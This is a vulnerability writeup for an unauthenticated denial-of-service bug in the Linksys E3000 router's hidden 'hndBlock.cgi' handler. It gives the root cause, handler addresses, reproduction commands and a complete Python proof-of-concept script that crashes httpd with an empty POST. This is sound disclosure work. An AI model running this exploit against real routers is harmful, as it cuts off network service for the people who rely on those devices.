# Information

**Vendor:** Cisco / Linksys

**Vendor website:** N/A (compiled from the local firmware sample and the existing single-finding writeup)

**Reported by:** local lab validation

**Affected products:** E3000

**Affected firmware version:** `1.0.06.002_US`

**Firmware sample filename:** `_FW_E3000_1.0.06.002_US_20140409_code.bin.extracted`

# Overview

This is the legacy writeup for the unauthenticated `hndBlock.cgi` DoS path. The core issue is not a stack overflow. Instead, an unauthenticated hidden CGI reaches a null-pointer path when required parameters are missing, which reliably crashes `httpd`.

The currently confirmed minimum impact is:

- unauthenticated access
- reliable remote DoS
- no evidence of direct shell access or controlled memory exploitation

# Vulnerability details

1. Root-cause summary:

- `hndBlock.cgi**` is registered as an unauthenticated hidden CGI
- it has no dedicated POST handler, but POST still reaches the generic hidden-CGI dispatcher
- even an empty POST body still creates an empty CGI table and reaches `apply_cgi()`
- the `hndBlock.cgi` branch directly calls `strlen()` on the return value of `get_cgi("url")`
- if `url=` is missing, the code reliably reaches `strlen(NULL)`

2. Key runtime path:

- `mime_handlers` entry:

```text
entry@0x10007bb0
pattern=hndBlock.cgi**
mime=text/html
cache=no_cache
post=0
get=0x4769fc
auth=0
```

- `0x4769fc` is the hidden CGI dispatcher
- `0x45f7a0` is `init_cgi`
- `0x47537c` is `apply_cgi`

3. Concrete crash reason:

```c
char *url = get_cgi("url");
len = strlen(url);
```

There is no `NULL` check here. Therefore:

- `POST /hndBlock.cgi`
- with an empty body, or without `url=`

is enough to trigger `strlen(NULL)`.

4. This legacy writeup also notes:

- even if `url` is supplied, the branch continues to use multiple fields without proper protection
- as a result, adding one field does not make the path safe in the current setup

# POC

Minimal reproduction:

```bash
./stop_httpd.sh || true
./start_httpd.sh 8080
python3 tools/e3000_hndblock_dos.py --base http://127.0.0.1:8080 --mode empty
```

Sample with `url`:

```bash
python3 tools/e3000_hndblock_dos.py --base http://127.0.0.1:8080 --mode url
```

Custom body:

```bash
python3 tools/e3000_hndblock_dos.py \
  --base http://127.0.0.1:8080 \
  --mode raw \
  --data 'url=example.com&policy=1'
```

Script-style PoC:

```python
#!/usr/bin/env python3
import argparse
import sys
import urllib.request


def build_body(mode: str, raw: str) -> bytes:
    if mode == "empty":
        return b""
    if mode == "url":
        return b"url=example.com"
    if mode == "full":
        return (
            b"url=example.com&policy=1&mac=00:11:22:33:44:55"
            b"&ip=1.2.3.4&blockpage=1"
        )
    return raw.encode()


def main() -> int:
    ap = argparse.ArgumentParser(description="Trigger unauth hndBlock.cgi crash on Cisco E3000.")
    ap.add_argument("--base", default="http://127.0.0.1:8080")
    ap.add_argument("--path", default="/hndBlock.cgi")
    ap.add_argument("--method", choices=("GET", "POST"), default="POST")
    ap.add_argument("--mode", choices=("empty", "url", "full", "raw"), default="empty")
    ap.add_argument("--data", default="")
    ap.add_argument("--timeout", type=int, default=5)
    args = ap.parse_args()

    base = args.base.rstrip("/")
    body = build_body(args.mode, args.data)

    if args.method == "GET":
        req = urllib.request.Request(base + args.path, method="GET")
    else:
        req = urllib.request.Request(
            base + args.path,
            data=body,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

    try:
        resp = urllib.request.urlopen(req, timeout=args.timeout)
        data = resp.read()
        print(f"[+] status={getattr(resp, 'status', 'unknown')}")
        print(f"[+] response_len={len(data)}")
    except Exception as exc:
        print(f"[!] request_error={exc!r}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

# effect

The conclusion of this legacy writeup is still clear:

1. this is a reliable crash caused by missing-parameter checks in an unauthenticated hidden CGI path
2. it should currently be classified as a remote DoS
3. there is no evidence yet to treat it as a stable shell / RCE chain
